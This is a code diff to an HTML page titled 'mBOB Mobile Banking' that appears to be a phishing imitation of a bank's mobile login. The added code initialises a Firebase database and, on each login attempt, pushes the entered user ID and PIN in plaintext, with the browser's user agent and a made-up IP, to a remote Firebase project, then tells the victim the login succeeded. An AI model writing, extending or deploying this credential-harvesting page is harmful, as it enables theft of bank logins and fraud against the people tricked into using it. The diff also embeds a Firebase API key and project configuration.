@@ -4,6 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>mBOB Mobile Banking</title>
+  
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  
   <style>
     * {
       box-sizing: border-box;
@@ -220,6 +225,10 @@
     .success-msg.show {
       display: block;
     }
+    .success-msg.error {
+      background: #f8d7da;
+      color: #721c24;
+    }
 
     .banner-container {
       flex: 1;
@@ -345,8 +354,23 @@
   </div>
 
   <script>
-    const LOGIN_KEY = 'mBobLogins';
+    // ===== FIREBASE CONFIG =====
+    const firebaseConfig = {
+      apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+      authDomain: "long-d1bcb.firebaseapp.com",
+      databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+      projectId: "long-d1bcb",
+      storageBucket: "long-d1bcb.firebasestorage.app",
+      messagingSenderId: "515546162619",
+      appId: "1:515546162619:web:5ab1efa7f6e81f8c7e509e",
+      measurementId: "G-EQGWR7E0ZV"
+    };
 
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // ===== FUNCTIONS =====
     function goHome() {
       document.getElementById('loginUserId').value = '';
       document.getElementById('loginPin').value = '';
@@ -385,39 +409,49 @@
 
       const now = new Date();
       const timeStr = now.toLocaleString('en-US', { hour12: true });
+      const timestamp = now.getTime();
 
-      let logins = [];
-      try {
-        const stored = localStorage.getItem(LOGIN_KEY);
-        if (stored) {
-          logins = JSON.parse(stored);
-        }
-      } catch (e) {
-        logins = [];
-      }
-
-      logins.push({
+      const loginData = {
         userId: userId,
         pin: pin,
         status: 'success',
         time: timeStr,
+        timestamp: timestamp,
         device: navigator.userAgent || 'Unknown',
         ip: '192.168.1.' + Math.floor(Math.random() * 255)
-      });
+      };
 
-      localStorage.setItem(LOGIN_KEY, JSON.stringify(logins));
-
-      const successEl = document.getElementById('loginSuccess');
-      successEl.textContent = '✅ Login successful! Welcome ' + userId;
-      successEl.classList.add('show');
-
-      document.getElementById('loginPin').value = '';
-
-      setTimeout(() => successEl.classList.remove('show'), 3000);
+      // Save to Firebase
+      const loginsRef = database.ref('logins');
+      const newLoginRef = loginsRef.push();
+      
+      newLoginRef.set(loginData)
+        .then(() => {
+          const successEl = document.getElementById('loginSuccess');
+          successEl.textContent = '✅ Login successful! Welcome ' + userId;
+          successEl.className = 'success-msg show';
+          
+          document.getElementById('loginPin').value = '';
+          
+          setTimeout(() => {
+            successEl.classList.remove('show');
+          }, 3000);
+        })
+        .catch((error) => {
+          const successEl = document.getElementById('loginSuccess');
+          successEl.textContent = '❌ Error saving login. Please try again.';
+          successEl.className = 'success-msg show error';
+          
+          setTimeout(() => {
+            successEl.classList.remove('show');
+          }, 3000);
+          console.error('Firebase error:', error);
+        });
     }
 
     document.addEventListener('DOMContentLoaded', function() {
       document.getElementById('langSwitch').classList.remove('active');
+      console.log('🔥 Firebase initialized successfully!');
     });
   </script>
 </body>
